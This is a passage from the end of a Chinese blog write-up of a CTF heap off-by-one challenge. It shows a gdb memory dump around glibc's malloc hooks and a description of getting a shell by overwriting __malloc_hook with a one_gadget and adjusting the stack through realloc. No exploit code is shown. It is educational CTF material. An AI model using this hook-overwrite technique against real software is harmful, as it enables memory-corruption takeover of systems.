<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">gdb-peda$ x /10gx 0x7fc45e1737a8-0x13<br>0x7fc45e173795 &lt;_IO_stdfile_0_lock+5&gt;:0x00000000000000000x0000000000000000<br>0x7fc45e1737a5 &lt;__after_morecore_hook+5&gt;:0x00000000000000000x0000000000000000<br>0x7fc45e1737b5 &lt;__malloc_initialize_hook+5&gt;:0x00000000000000000x0000000000000000<br>0x7fc45e1737c5 &lt;narenas_limit.11257+5&gt;:0x00000000000000000x0000000000000000<br>0x7fc45e1737d5 &lt;aligned_heap_area+5&gt;:0x00000000000000000x0000000000000000<br></code></pre></td></tr></table></figure>

<p>         可以注意到，此时，这里变得不再合适了</p>
<p>        那么接下来在进行malloc的时候，将因为无法通过chunk size的检查导致程序直接crash</p>
<p>      笔者目前不太清楚是什么原因导致了 _IO_stdfile_0_lock中的地址被清除了，若以后得知，到那时再做补充吧</p>
<p>        提供的代替方案之一是：覆盖__malloc_hook为某个one_gadget，然后通过realloc调整栈帧，最后用malloc来获取shell</p>
<p>        在该方案中，__malloc_hook附近始终都有适合用于伪造的位置，因此这个方法是可以成立的，笔者也同样在该方法中拿到了shell，具体的exp请参照参考文章第二篇 ​</p>
<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/off-by-one/#_1">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/off-by-one/#_1</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bhxdn/p/14293978.html">https://www.cnblogs.com/bhxdn/p/14293978.html</a></p>
<p><strong>插画ID：91452046</strong></p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2021/09/14/plaidctf2015-ebp/">← Next plaidctf2015 - ebp —— FMT记录</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2021/09/07/buuctfinndy-rop/">BUUCTF - inndy_rop 杂谈、32位与64位系统调用、与思考 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/6.png" alt="Logo"></a><h1 id="Dr"><a href="TokameinE">TokameinE</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/ErodedElk"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" target="_blank" rel="noopener" href="https://space.bilibili.com/1782544616"><i class="fa-brands fa-bilibili" alt="BiliBili"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E6%96%87%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">正文：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%96%B9%E6%B3%95%EF%BC%9Ammap%E6%8B%93%E5%B1%95"><span class="toc-number">2.1.</span> <span class="toc-text">第一种方法：mmap拓展</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-number">2.2.</span> <span class="toc-text">第二种方法：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%B3%95%EF%BC%9A"><span class="toc-number">2.3.</span> <span class="toc-text">第三法：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">参考文章：</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>